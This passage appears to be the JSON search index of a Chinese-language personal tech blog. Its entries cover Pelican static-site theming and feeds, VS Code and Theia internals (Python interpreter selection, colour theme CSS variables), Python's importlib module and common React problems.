source_path 属性的字符串值。 变量 描述 author 该页 作者 content 页面渲染内容 date 表示page页日期的日期时间对象 date_format 默认日期格式或区域设置日期格式 default_template 默认模板名称 in_default_lang 表示文章是否采用默认语言编写的布尔值 lang 文章所用语言 locale_date 按 date_format 格式化的日期 metadata 文章头部元数据 dict save_as 保存page页的位置 slug page页的slug内容 source_path page页源文件的完整系统路径 relative_source_path 基于 PATH 的page页源文件的相对路径 status page页状态，可以是'已发布'、'隐藏'或'草稿' summary 展示的摘要内容 tags 标签 对象列表 template 使用的模板名称 title page页标题 translations 翻译 文章 对象列表 url page页的URL Feeds订阅源 feed变量在版本3.0中发生更改。\n每个变量现在都在名称中明确指出是ATOM还是RSS。\nATOM仍然是默认值。\n旧主题需要对此进行更新。 下面是feed变量的一个完整列表: FEED_ATOM\nFEED_RSS\nFEED_ALL_ATOM\nFEED_ALL_RSS\nCATEGORY_FEED_ATOM\nCATEGORY_FEED_RSS\nAUTHOR_FEED_ATOM\nAUTHOR_FEED_RSS\nTAG_FEED_ATOM\nTAG_FEED_RSS\nTRANSLATION_FEED_ATOM\nTRANSLATION_FEED_RSS","tags":"文档","url":"/yq-doc-frame-pelican-theme-template.html","loc":"/yq-doc-frame-pelican-theme-template.html"},{"title":"主题使用","text":"相关资源: 官方主题集合仓库: https://github.com/getpelican/pelican-themes 仓库主题预览: https://pelicanthemes.com 使用开源/他人主题 可以将官方主题仓库集合clone到本地, 然后直接在 pelicanconf.py 定义想要用的 THEME = \"theme-name\" 也可以直接使用 pelican-themes 指令 比如安装 flex 主题 注解 不管用哪个都需要本地有 查看本地已经安装到pelican的主题 pelican-themes -l # 加 -v 可以查看安装路径 # pelican-themes -v -l 自定义主题 可参考: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html 除了配置 THEME , 启动时候可以指定使用某个主题启动 pelican content -s pelicanconf.py -t /projects/your-site/themes/your-theme","tags":"文档","url":"/yq-doc-pelican-theme.html","loc":"/yq-doc-pelican-theme.html"},{"title":"评论-分析统计支持","text":"通过配置文件引入即可. 主要通过以下两个变量 # 评论支持 DISQUS_SITENAME = \"\" # 分析统计支持 GOOGLE_ANALYTICS = \"\" 分析统计国内可以使用 友言 , 多说 , 百度统计","tags":"文档","url":"/yq-doc-frame-pelican-issuse-dis.html","loc":"/yq-doc-frame-pelican-issuse-dis.html"},{"title":"文档","text":"相关资源: 时区缩写对照表: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones","tags":"文档","url":"/yq-doc.html","loc":"/yq-doc.html"},{"title":"Jekyll","text":"基于 ruby","tags":"文档","url":"/yq-doc-fram-Jekyll.html","loc":"/yq-doc-fram-Jekyll.html"},{"title":"nikola","text":"基于Python的文档框架, 支持rst, 貌似比较冷门 相关资源: github仓库: https://github.com/getnikola/nikola.git 官方文档: https://getnikola.com/documentation.html 第三方简单使用: https://blog.jiangfuquan.com/posts/nikola-blog/","tags":"文档","url":"/yq-doc-fram-nikola.html","loc":"/yq-doc-fram-nikola.html"},{"title":"文档托管平台","text":"提供此功能站点包括但不仅限于 码云 https://gitee.com/help/articles/4136#article-header0 , 托管需要实名认证(需上传手持证件), 放弃. github https://docs.github.com/zh/pages/getting-started-with-github-pages coding 待补充...","tags":"文档","url":"/yq-doc-page.html","loc":"/yq-doc-page.html"},{"title":"sugar-blog","text":"sugar-blog 是一个基于TS开发的前端博客模版框架 相关资源 github地址: https://github.com/ATQQ/sugar-blog 文档: https://theme.sugarat.top","tags":"文档","url":"/yq-doc-fram-sugar-blog.html","loc":"/yq-doc-fram-sugar-blog.html"},{"title":"将Sphinx项目转换为Blog","text":"使用 ABlog 插件 相关资源: github地址: https://github.com/sunpy/ablog 英文文档: ABlog for Sphinx 第三方中文文档: ABlog 用于 Sphinx","tags":"文档","url":"/yq-doc-fram-sphinx-sp-to-blog.html","loc":"/yq-doc-fram-sphinx-sp-to-blog.html"},{"title":"pelican","text":"pelican 是一个比较方便的开源的静态博客生成的框架. 基于Python 安装: python -m pip install pelican 在接触 pelican 之前, 一直使用的是 Sphinx , 但是 Sphinx 的侧重点在于\n教程文档的生成. 而非博客, 虽然后 ABlog 拓展可以让其看起来类似博客,\n但个人以为, 专用的事就交给专用的框架吧. 注解 另一方面, Sphinx 提供的功能比较强大, 但是, 迁移很麻烦. 一些相关资源: 官方仓库: https://github.com/getpelican/pelican 官方文档(英): https://docs.getpelican.com/en/latest/index.html 第三方中文文档: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/publish.html 简单使用见 创建pelican项目 主题 见 pelican主题 插件 见 pelican插件 引用本地文档 Pelican提供了一个特殊变量 {filename} ，\n指代当前文件的路径, 比如我有一个如下结构的文档: content/文档/文本标记语言/reStructuredText\n├── Docutils支持指令.rst\n└── index.rst 我想在 index 中引用 Docutils支持指令 , 那么这样写即可 `引用的说明:Docutils支持指令 <{filename}./Docutils支持指令.rst> `_ 前面的 引用的说明:Docutils支持指令 建议自定义加上,\n否则页面显示的就是后面的纯文本了, 不好看.\n另外引用的文件必须带后缀, 如果只是 `引用的说明:Docutils支持指令 <{filename}./Docutils支持指令> `_ (无后缀)则无法识别. 可能遇见的问题 评论-分析统计支持","tags":"文档","url":"/yq-doc-pelican.html","loc":"/yq-doc-pelican.html"},{"title":"Docutils支持指令","text":"原生Docutils支持指令见 https://docutils.sourceforge.io/docs/ref/rst/directives.html","tags":"文档","url":"/yq-doc-lan-rst-directives.html","loc":"/yq-doc-lan-rst-directives.html"},{"title":"markdown","text":"官网主页: https://daringfireball.net/projects/markdown/","tags":"文档","url":"/yq-doc-lan-md.html","loc":"/yq-doc-lan-md.html"},{"title":"reStructuredText","text":"最初貌似是专为Python文档提供的一种标记语言 相关资源: 官网主页: https://docutils.sourceforge.io/rst.html#user-documentation 三方使用教程: Create Documentation with RST, Sphinx, Sublime, and GitHub 在Python中, 是 Docutils 提供了解析支持 指令支持 原生Docutils支持指令见 Docutils支持指令 自定义rst指令见: 自定义rst指令 拓展 看到个叫 MyST 的拓展, 看描述是整合了 markdown 和 rst,\n参考: MyST","tags":"文档","url":"/yq-doc-lan-rst.html","loc":"/yq-doc-lan-rst.html"},{"title":"launch.json配置","text":"如何引入系统环境变量 使用 ${env:XXX} , 如想在系统的PATH前增加某些路径\n再传下去 { \"version\" : \"0.2.0\" , \"configurations\" : [ { \"name\" : \"Launch\" , //.. \"env\" : { \"PATH\" : \"/usr/local/xxx:${env:PATH}\" }, \"args\" : [], \"preLaunchTask\" : \"setupEnv\" , } ] }","tags":"工具软件","url":"/yq-util-vscode.html","loc":"/yq-util-vscode.html"},{"title":"vscode下jinja版本html格式化","text":"使用 djLint 插件 在 settings.json 全局配置 \"[html][django-html][handlebars][hbs][mustache][jinja][jinja-html][nj][njk][nunjucks][twig]\" : { \"editor.defaultFormatter\" : \"monosans.djlint\" }, 其他相关插件: Jinja语法提示: Jinja Snippets 参考: https://segmentfault.com/q/1010000043305483","tags":"工具软件","url":"/yq-jinja-format.html","loc":"/yq-jinja-format.html"},{"title":"tvbox相关","text":"TVBox 配置汇总 TVBox 内置版 配置-饭太硬","tags":"工具软件","url":"/yq-util-tvbox.html","loc":"/yq-util-tvbox.html"},{"title":"vscode的正则替换","text":"有时候想批量多文件一起替换. 正则使用此处不做表, 主要是vscode怎么用,\n对于搜索区域正则组(即加了括号)的内容, 按照顺序,\n在替换区域的引用按照顺序, 依次为 $1 , $2 ... 如对所有 do some 后面指定内容加后缀.\n搜索区: do some([a-z]*) 替换区: do some$1_xxx","tags":"工具软件","url":"/yq-util-vscode-re.html","loc":"/yq-util-vscode-re.html"},{"title":"创建pelican项目","text":"先安装模块 pip install pelican 快速创建 mkdir blog-pro cd blog-pro\npelican-quickstart 编译文档 pelican content 启动到本地 pelican --listen 如果希望监听文件更新, 实时刷新 pelican --autoreload --listen","tags":"文档","url":"/yq-doc-pelican-create.html","loc":"/yq-doc-pelican-create.html"},{"title":"插件","text":"官方有一个插件集合仓库: https://github.com/getpelican/pelican-plugins","tags":"文档","url":"/yq-doc-pelican-plugins.html","loc":"/yq-doc-pelican-plugins.html"},{"title":"关于vscode-python插件","text":"插件github地址: https://github.com/microsoft/vscode-python 此插件提供了对Python相关的支持 问题 在 Ubuntu 20 下, 安装自行打包的 Python3.7 后,\n无法在 theia 中使用, vscode-python 报错: The Python path in your debug configuration is invalid. 原因 自行打包的 Python3.7 , 而20对应的是 Python3.8 自行安装的 Python3.7 , 需要配置环境变量比如PATH, LD等 需要设置的环境变量无法给到插件里去, 除非在theia启动时就给, 或者直接全局设置 源码调用 对于Python相关调用, 库位置放在 python_files 目录下,\n最主要获取执行文件信息使用的是 python_files/interpreterInfo.py import json import sys obj = {} obj [ \"versionInfo\" ] = tuple ( sys . version_info ) obj [ \"sysPrefix\" ] = sys . prefix obj [ \"sysVersion\" ] = sys . version obj [ \"is64Bit\" ] = sys . maxsize > 2 ** 32 在ts中的调用大致在 src/client/pythonEnvironments/common/externalDependencies.ts export async function shellExecute ( command : string , options : ShellOptions = {}) : Promise < ExecutionResult < string >> { const useWorker = false ; const service = await internalServiceContainer . get < IProcessServiceFactory > ( IProcessServiceFactory ). create (); options = { ... options , useWorker }; return service . shellExec ( command , options ); } 没有提供设置环境变量的方式 解决 找个 py 文件, 进去后手动选一个匹配的解释器. 选择解释器的功能也是由插件实现的. 命令位置大致在 src/client/interpreter/configuration/interpreterSelector/commands/setInterpreter.ts 的 private readonly manualEntrySuggestion : ISpecialQuickPickItem = { label : ` ${ Octicons . Folder } ${ InterpreterQuickPickList . enterPath . label } ` , alwaysShow : true , }; 浅谈一下vscode-python插件与theia的通信 主要是解释器选择这一块.\n这一块实际的交互位置大概是在 node_modules/@theia/plugin-ext/src/main/browser/quick-open-main.ts 的 QuickOpenMainImpl.$createOrUpdate , 此处只贴出关键部分 $createOrUpdate ( params : TransferQuickInput ) : Promise < void > { const sessionId = params . id ; let session : QuickInputSession ; const candidate = this . sessions . get ( sessionId ); if ( ! candidate ) { if ( params . type === 'quickPick' ) { const quickPick = this . quickInputService . createQuickPick (); quickPick . onDidAccept (() => { this . proxy . $acceptOnDidAccept ( sessionId ); }); quickPick . onDidChangeActive (( items : Array < IQuickPickItem > ) => { this . proxy . $onDidChangeActive ( sessionId , items . map ( item => ( item as TransferQuickPickItems ). handle )); }); quickPick . onDidChangeSelection (( items : Array < IQuickPickItem > ) => { this . proxy . $onDidChangeSelection ( sessionId , items . map ( item => ( item as TransferQuickPickItems ). handle )); }); quickPick . onDidTriggerButton (( button : QuickInputButtonHandle ) => { this . proxy . $acceptOnDidTriggerButton ( sessionId , button ); }); quickPick . onDidTriggerItemButton ( e => { this . proxy . $onDidTriggerItemButton ( sessionId , ( e . item as TransferQuickPickItems ). handle , ( e . button as TransferQuickPickItems ). handle ); }); quickPick . onDidChangeValue (( value : string ) => { this . proxy . $acceptDidChangeValue ( sessionId , value ); }); quickPick . onDidHide (() => { this . proxy . $acceptOnDidHide ( sessionId ); }); session = { input : quickPick , handlesToItems : new Map () }; } else { ... } 这里把theia内部 quickPick 的事件进行一个转发, 从而做到交互. quickPick 又是通过 node_modules/@theia/monaco/src/browser/monaco-quick-input-service.ts 的 MonacoQuickInputService.createQuickPick 服务进行转发的. createQuickPick < T extends QuickPickItem > () : QuickPick < T > { const quickPick = this . monacoService . createQuickPick < MonacoQuickPickItem < T >> (); return this . wrapQuickPick ( quickPick ); } 注解 如果要手动调用插件的设置py解释器, 可以基于转发这一点, 在 MonacoQuickInputService 服务 做个拦截.\n然后手动将需要的解析器给过去. 而这个 quickPick 实现定义在 node_modules/@theia/monaco-editor-core/src/vs/base/parts/quickinput/browser/quickInput.ts 的 QuickPick 类. 配置默认的Python解释器 尝试过在theia劫持跟 vscode-python 的通信, 但是失败了. 东西是拿到了, 但是后面貌似被刷新了还是怎的, 无效. 尝试直接启动时设置首选项, 勉强算成功. 不过有个缺点是, 更新设置时, 会提示配置更新需要重启. 如何实现启动时设置首选项? 调用 PreferenceService 服务的 set 方法即可. @inject ( PreferenceService ) protected readonly preferenceService : PreferenceService ; // \"python.defaultInterpreterPath\": \"python\" preferenceService . set ( \"python.defaultInterpreterPath\" , \"/usr/local/bin/mypython\" )","tags":"前端","url":"/yq-frontend-vscode-python.html","loc":"/yq-frontend-vscode-python.html"},{"title":"importlib","text":"官网: https://docs.python.org/zh-cn/3/library/importlib.html 实现了import部分功能及动态导入 这里仅介绍主要的几个 import_module():导入模块,返回模块对象。 find_loader():根据模块名称查找其加载器(loader),用于动态导入。 load_module():使用加载器加载模块,返回模块对象。 reload():重载已加载的模块。 get_module():根据模块对象获取模块信息。 __import__ 注解 程序式地导入模块应该使用 import_module() 而不是这个函数。 import_module importlib.import_module(name, package=None) 导入一个模块。 name 指定了以绝对或相对导入方式导入什么模块 (比如要么像这样 pkg.mod 或者这样 ..mod)。\n如果参数 name 使用相对导入的方式来指定，那么 package 参数必须设置为那个包名，\n这个包名作为解析这个包名的锚点 (比如 import_module('..mod', 'pkg.subpkg') 将会导入 pkg.mod)。 import_module() 函数是一个对 importlib.__import__() 进行简化的包装器。\n这意味着该函数的所有语义都来自于 importlib.__import__()。\n这两个函数之间最重要的不同点在于 import_module() 返回指定的包或模块 (例如 pkg.mod)，\n而 __import__() 返回最高层级的包或模块 (例如 pkg)。 如果动态导入一个自解释器开始执行以来被创建的模块（即创建了一个 Python 源代码文件），\n为了让导入系统知道这个新模块，可能需要调用 invalidate_caches()。 find_loader importlib.find_loader(name, path=None) 查找一个模块的加载器，可选择地在指定的 path 里面。\n如果这个模块是在 sys.modules，\n那么返回 sys.modules[name].__loader__ (除非这个加载器是 None 或者是没有被设置， 在这样的情况下，会引起 ValueError 异常）。\n否则使用 sys.meta_path 的一次搜索就结束。如果未发现加载器，则返回 None。 点状的名称没有使得它父包或模块隐式地导入，因为它需要加载它们并且可能不需要。\n为了适当地导入一个子模块，需要导入子模块的所有父包并且使用正确的参数提供给 path。 3.3 新版功能. 在 3.4 版更改: 如果没有设置 __loader__，会引起 ValueError 异常，就像属性设置为 None 的时候一样。 3.4 版后已移除: 使用 importlib.util.find_spec() 来代替。 invalidate_caches importlib.invalidate_caches() 使查找器存储在 sys.meta_path 中的内部缓存无效。\n如果一个查找器实现了 invalidate_caches()，那么它会被调用来执行那个无效过程。\n如果创建/安装任何模块，同时正在运行的程序是为了保证所有的查找器知道新模块的存在，那么应该调用这个函数。 reload importlib.reload(module) 重新加载之前导入的 module。\n那个参数必须是一个模块对象，所以它之前必须已经成功导入了。\n这在你已经使用外部编辑器编辑过了那个模块的源代码文件并且想在退出 Python 解释器之前试验这个新版本的模块的时候将很适用。\n函数的返回值是那个模块对象（如果重新导入导致一个不同的对象放置在 sys.modules 中，那么那个模块对象是有可能会不同）。 当执行 reload() 的时候： Python 模块的代码会被重新编译并且那个模块级的代码被重新执行，\n通过重新使用一开始加载那个模块的 loader，定义一个新的绑定在那个模块字典中的名称的对象集合。\n扩展模块的``init``函数不会被调用第二次。\n与Python中的所有的其它对象一样，旧的对象只有在它们的引用计数为0之后才会被回收。\n模块命名空间中的名称重新指向任何新的或更改后的对象。\n其他旧对象的引用（例如那个模块的外部名称）不会被重新绑定到引用的新对象的，并且如果有需要，必须在出现的每个命名空间中进行更新。 有一些其他注意事项： 当一个模块被重新加载的时候，它的字典（包含了那个模块的全区变量）会被保留。\n名称的重新定义会覆盖旧的定义，所以通常来说这不是问题。\n如果一个新模块没有定义在旧版本模块中定义的名称，则将保留旧版本中的定义。\n这一特性可用于作为那个模块的优点，如果它维护一个全局表或者对象的缓存 —— 使用 try 语句，\n就可以测试表的存在并且跳过它的初始化，如果有需要的话: try:\n    cache\nexcept NameError:\n    cache = {} 重新加载内置的或者动态加载模块，通常来说不是很有用处。\n不推荐重新加载\"sys，__main__，builtins 和其它关键模块。\n在很多例子中，扩展模块并不是设计为不止一次的初始化，并且当重新加载时，可能会以任意方式失败。 如果一个模块使用 from ... import ... 导入的对象来自另外一个模块，\n给其它模块调用 reload() 不会重新定义来自这个模块的对象 ——\n解决这个问题的一种方式是重新执行 from 语句，另一种方式是使用 import 和限定名称(module.name)来代替。 如果一个模块创建一个类的实例，重新加载定义那个类的模块不影响那些实例的方法定义———它们继续使用旧类中的定义。\n对于子类来说同样是正确的。 3.4 新版功能. 在 3.7 版更改: 如果重新加载的模块缺少 ModuleSpec ，则会触发 ModuleNotFoundError 。 metadata metadata.entry_points 位置: from importlib.metadata import entry_points 通过参数 group 或者 name, 找到所有匹配的已安装包的入口. 关于loader加载器 在Python的importlib包中,加载器(Loader)是用来加载模块的对象。它包含了导入模块所需要的逻辑和信息。\n主要有以下几种加载器: SourceFileLoader:从源文件(.py文件)加载模块。 PyLoader:从编译好的模块文件(.pyc文件)加载模块。 PackageLoader:从包中加载子模块。 ExtensionFileLoader:从扩展模块(.so/.pyd文件)加载模块。 ImpLoader:兼容Import模块的加载器,用于从已编译好的模块加载模块。 等等。 加载器具有以下方法: exec_module(module):执行模块的模块体代码,initialize模块对象。 load_module(fullname):加载模块,返回模块对象。 get_code(fullname):获取模块的代码对象。 get_source(fullname):获取模块的源代码。 is_package(fullname):判断模块是否是包。 get_filename(fullname):获取模块的文件名。 通过这些方法,加载器实现了导入模块的主要逻辑。 例如,SourceFileLoader可以从源文件读取代码并执行,返回模块对象。\n在importlib中,find_loader()函数通过模块名称找到相应的加载器。\n然后我们可以调用加载器的load_module()方法加载该模块。例如: import importlib.util\n\nname = 'example'\nloader = importlib.util.find_loader(name)\nmodule = loader.load_module(name) 这里我们找到example模块的加载器loader,然后通过loader加载example模块,获得模块对象module。 eg, 模块导入: module = importlib.import_module('math')\nprint(module.sqrt(16))  # 4.0 获取模块信息: name = 'os'\nloader = importlib.find_loader(name)\nmodule = loader.load_module(name)\n\nprint(module.__file__)\nprint(module.__package__)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-importlib.html","loc":"/yq-docs-rear-end-python-python-standard-library-importlib.html"},{"title":"Python标准库","text":".分类 argparse asyncio atexit bdb bisect cmath collections concurrent configparser contextlib contextvars csv ctypes dataclasses datetime decimal dis fileinput fnmatch fractions functools gettext glob heapq hmac html http importlib inspect itertools json logging math mmap multiprocessing operator os pelican pip pipx pprint pytz random re resource secrets semantic-version shutil signal site socket socketserver ssl string struct subprocess sys tarfile tempfile textwrap threading time timeit tkinter traceback types typing unicodedata unittest urllib uuid weakref xml","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-index.html","loc":"/yq-docs-rear-end-python-python-standard-library-index.html"},{"title":"pelican","text":"静态博客文档生成 注解 之前一直用的sphinx, 貌似最兼容的普通文档. 安装: pip install pelican","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-pelican.html","loc":"/yq-docs-rear-end-python-python-standard-library-pelican.html"},{"title":"furo","text":"一个开源的sphinx主题. 默认的效果大概这样 安装: pip install furo github地址: https://github.com/pradyunsg/furo?tab=readme-ov-file 文档: https://pradyunsg.me/furo/quickstart/","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-furo.html","loc":"/yq-docs-rear-end-python-python-three--party-library-furo.html"},{"title":"Python三方库","text":"airtest beautifulsoup4 bs4 Jinja2 Scrapy aiohttp alive-progress buildozer celery cerberus click clint cryptography ffmpeg frida furo grpc jsonrpc jupyter kivy line_profiler lxml m3u8 maturin memory_profiler nuitka numpy opencv-python outcome pandas pathos pillow playwright progress psutil py2app pySerial pyaml pyinstaller pymysql pyside6 pystack pytest-rerunfailures pytest pytorch pywin32 redis requests rich schedule scikit-learn selenium sphinx-autobuild sphinx tqdm trio tomli tomli_w tomlkit xortool yarl","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-index.html"},{"title":"React","text":"前端框架 React, 官方中文: https://zh-hans.react.dev/reference/react hooks 高性能组件 一些好用的react库 组件库 API 问题","tags":"前端","url":"/yq-docs-front-end-frame-react-index.html","loc":"/yq-docs-front-end-frame-react-index.html"},{"title":"关于React使用自定义组件却需要使用状态","text":"找了很多种方法，\n最终只有将需要一种方法: 将需要用到状态的这部分内容， 分离出去 ，\n至于如何分离， 大致有两种方式 函数组件+HOOP 继承 React.Component 的类组件， 使用其中的 state 与 setState 别无它法， 除非你在自己的这个自定义类中将 React.Component 中的相关内容重写一遍，\n很麻烦","tags":"前端","url":"/yq-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html","loc":"/yq-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html"},{"title":"react直接执行ts","text":"使用WebStrom创建的React的ts项目, 发现不需要手动tsc编译就可以直接运行: react-script start 创建时, 触发的实际指令: /usr/local/bin/npx --yes create-react-app . --template typescript 这里 --yes ` 表示, 若有询问, 直接给 `yes 后面研究了一下, 实际上是用了 babel 的 @babel/preset-typescript ,\n这个模块集成于 babel (>=7.0)内部, 在开发时, 可以在执行时候在内存中\n将ts转换为js, 以实现类似ts直接执行的效果 见: https://babeljs.io/docs/babel-preset-typescript 注解 可以看到项目目录下有个 node_modules/.cache/babel-loader 目录,\n相关缓存就是在这下面的.","tags":"前端","url":"/yq-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html","loc":"/yq-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html"},{"title":"父子组件的相互调用","text":"子组件调用父组件的方法 这个比较简单, 父组件调用子组件的时候, 像普通传参一样,\n将需要调用的方法传给子组件即可. 父组件调用子组件的方法 父组件使用: render(){\n  return <Child\n    ref={view => {this._childView = view || undefined}}\n  />\n} 然后通过 this._childView 调用子组件即可 详情参考: createRef","tags":"前端","url":"/yq-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html","loc":"/yq-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html"},{"title":"React 问题","text":"ref类型不匹配 函数组件无ref属性 调用自定义子函数组件属性 父子组件的相互调用 关于React使用自定义组件却需要使用状态 直接执行ts问题 报错 Too many re-renders 较完整输出: Too many re-renders. React limits the number of renders to prevent an infinite loop 如果是类组件, 看看是不是 render() 里直接调用 setState() 如果是函数组件, 看看是不是 返回的组件 里直接调用 useState 相关的 setXxx 方法.\n比如: const ComX = () => {\n\n  const [num, setNum] = useState(0)\n\n  setNum(\n    num + 1\n  )\n  return (\n    <div>\n    </div>\n  )\n} 因为一直在 setNum , 就一直在渲染. 对于函数组件而言, 这种可以改到 useEffect 里: useEffect(() => {\n  setNum(\n    num + 1\n  )\n}, [])","tags":"前端","url":"/yq-docs-front-end-frame-react-question-index.html","loc":"/yq-docs-front-end-frame-react-question-index.html"},{"title":"多主题","text":"主要: node_modules/@theia/core/src/browser/theming.ts 下定义的 ThemeService 服务. 在 init 方法中注册了默认主题: protected init(): void {\n  this.register(...BuiltinThemeProvider.themes);\n  ... 可以看到默认主题定义: export class BuiltinThemeProvider {\n\n    static readonly darkTheme: Theme = {\n        id: 'dark',\n        type: 'dark',\n        label: 'Dark (Theia)',\n        editorTheme: 'dark-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts\n    };\n\n    static readonly lightTheme: Theme = {\n        id: 'light',\n        type: 'light',\n        label: 'Light (Theia)',\n        editorTheme: 'light-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts\n    };\n\n    static readonly hcTheme: Theme = {\n        id: 'hc-theia',\n        type: 'hc',\n        label: 'High Contrast (Theia)',\n        editorTheme: 'hc-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts\n    };\n\n    static readonly hcLightTheme: Theme = {\n        id: 'hc-theia-light',\n        type: 'hcLight',\n        label: 'High Contrast Light (Theia)',\n        editorTheme: 'hc-theia-light' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts\n    };\n\n    static readonly themes = [\n        BuiltinThemeProvider.darkTheme,\n        BuiltinThemeProvider.lightTheme,\n        BuiltinThemeProvider.hcTheme,\n        BuiltinThemeProvider.hcLightTheme\n    ];\n} 看注释, 都是在 packages/monaco/src/browser/textmate/monaco-theme-registry.ts 定义注册的: @injectable()\nexport class MonacoThemeRegistry {\n\n    @inject(TextmateRegistryFactory) protected readonly registryFactory: TextmateRegistryFactory;\n\n    initializeDefaultThemes(): void {\n        this.register(require('../../../data/monaco-themes/vscode/dark_theia.json'), {\n            './dark_vs.json': require('../../../data/monaco-themes/vscode/dark_vs.json'),\n            './dark_plus.json': require('../../../data/monaco-themes/vscode/dark_plus.json')\n        }, 'dark-theia', 'vs-dark');\n        this.register(require('../../../data/monaco-themes/vscode/light_theia.json'), {\n            './light_vs.json': require('../../../data/monaco-themes/vscode/light_vs.json'),\n            './light_plus.json': require('../../../data/monaco-themes/vscode/light_plus.json'),\n        }, 'light-theia', 'vs');\n        this.register(require('../../../data/monaco-themes/vscode/hc_theia.json'), {\n            './hc_black.json': require('../../../data/monaco-themes/vscode/hc_black.json')\n        }, 'hc-theia', 'hc-black');\n        this.register(require('../../../data/monaco-themes/vscode/hc_theia_light.json'), {\n            './hc_light.json': require('../../../data/monaco-themes/vscode/hc_light.json')\n        }, 'hc-theia-light', 'hc-light');\n    } 以 dark_vs.json 为例, 其中颜色定义为: {\n    \"$schema\": \"vscode://schemas/color-theme\",\n    \"name\": \"Dark (Visual Studio)\",\n    \"colors\": {\n        \"editor.background\": \"#1E1E1E\",\n        \"editor.foreground\": \"#D4D4D4\",\n\n... 可以看到颜色定义为类似于: editor.background 的样式, 但是实际使用的时候, 是: --editor-background 的样式, 那么是在哪里转换的? 有几个地方 theia-core模块的定义1 theia-core模块的定义2 vs的editor下面的转换 theia-core模块的定义1 这个的触发方式是 node_modules/@theia/core/src/browser/color-application-contribution.ts 定义的事件: @injectable()\nexport class ColorApplicationContribution implements FrontendApplicationContribution {\n\n    ...\n\n    onStart(): void {\n        for (const contribution of this.colorContributions.getContributions()) {\n            contribution.registerColors(this.colors);\n        }\n        this.themeService.initialized.then(() => this.update());\n        this.themeService.onDidColorThemeChange(() => {\n            this.update();\n            this.updateThemeBackground();\n        });\n\n    protected update(): void {\n        this.toUpdate.dispose();\n        this.windows.forEach(win => this.updateWindow(win));\n        this.onDidChangeEmitter.fire();\n    }\n\n    protected updateWindow(win: Window): void {\n        const theme = 'theia-' + this.themeService.getCurrentTheme().type;\n\n        win.document.body.classList.add(theme);\n        this.toUpdate.push(Disposable.create(() => win.document.body.classList.remove(theme)));\n\n        const documentElement = win.document.documentElement;\n        if (documentElement) {\n            for (const id of this.colors.getColors()) {\n                const variable = this.colors.getCurrentCssVariable(id);\n                if (variable) {\n                    const { name, value } = variable;\n                    documentElement.style.setProperty(name, value);\n                    this.toUpdate.push(Disposable.create(() => documentElement.style.removeProperty(name)));\n                }\n            }\n        }\n    }\n\n} 如何实现 动态属性切换 也在这: documentElement.style.setProperty(name, value); 这里会拿到CSS属性名, 与对应颜色值, 使用 documentElement.style.setProperty 动态设置进去. 可以通过跟断点验证这一点. const variable = this.colors.getCurrentCssVariable(id); 调到的是 node_modules/@theia/core/src/browser/color-registry.ts 的 ColorRegistry : @injectable()\nexport class ColorRegistry {\n\n    getCurrentCssVariable(id: string): ColorCssVariable | undefined {\n        const value = this.getCurrentColor(id);\n        if (!value) {\n            return undefined;\n        }\n        const name = this.toCssVariableName(id);\n        return { name, value };\n    }\n\n    toCssVariableName(id: string, prefix = 'theia'): string {\n        return `--${prefix}-${id.replace(/\\./g, '-')}`;\n    }\n\n} 结论 会在theia自定义的样式前加上 --theia- 前缀, 并把 . 转换为 - theia-core模块的定义2 这里主要讲如何讲 json 的内容完整的注册进去.\n如果是一个完全自定义的样式变量, 光写json是不行的. 以下面的两个自定义颜色变量为例: {\n    \"$schema\": \"vscode://schemas/color-theme\",\n    \"name\": \"Dark (Custom)\",\n    \"colors\": {\n        \"ideC.editor.background\": \"#1E1E1E\",\n        \"ideC.editor.foreground\": \"#D4D4D4\",\n\n... 还需要将这个变量注册进去, 注册实现位于 node_modules/@theia/core/src/browser/color-application-contribution.ts 的 ColorContribution 贡献点的 registerColors 即可: import {ColorContribution} from \"@theia/core/lib/browser/color-application-contribution\";\nimport {ColorRegistry} from \"@theia/core/lib/browser/color-registry\";\nimport {ColorDefinition} from \"@theia/core/src/common/color\";\n\n// \"ideC.editor.background\": \"#1E1E1E\",\n// \"ideC.editor.foreground\": \"#D4D4D4\",\n\nclass CustomColor implements ColorContribution{\n\n    private customColorID: ColorDefinition[] = [\n        {id: \"ideC.editor.background\", description: \"color 1\"},\n        {id: \"ideC.editor.foreground\", description: \"color 2\"},\n    ]\n\n    registerColors(colors: ColorRegistry): void {\n        colors.register(...this.customColorID)\n    }\n\n} 警告 只有注册到贡献点的id, 才会去json里面找 主要是调用的 node_modules/@theia/monaco-editor-core/src/vs/platform/theme/common/colorRegistry.ts`下\n`ColorRegistry 的 registerColor . 可以理解这个 ColorRegistry() 是一个缓存,\njson里面的配置会先读到这里, 然后在 theia-core模块的定义1 中需要 documentElement.style.setProperty 的时候再从这个缓存里读. vs的editor下面的转换 主要文件: node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts 位于 node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts 下 StandaloneThemeService 的 _updateThemeOrColorMap const colorVariables: string[] = [];\nfor (const item of colorRegistry.getColors()) {\n    const color = this._theme.getColor(item.id, true);\n    if (color) {\n        colorVariables.push(`${asCssVariableName(item.id)}: ${color.toString()};`);\n    }\n} 主要是 asCssVariableName , 看看它的定义: export function asCssVariableName(colorIdent: ColorIdentifier): string {\n    return `--vscode-${colorIdent.replace(/\\./g, '-')}`;\n} 结论 会在vscode的样式前加上 --vscode- 前缀, 并把 . 转换为 - 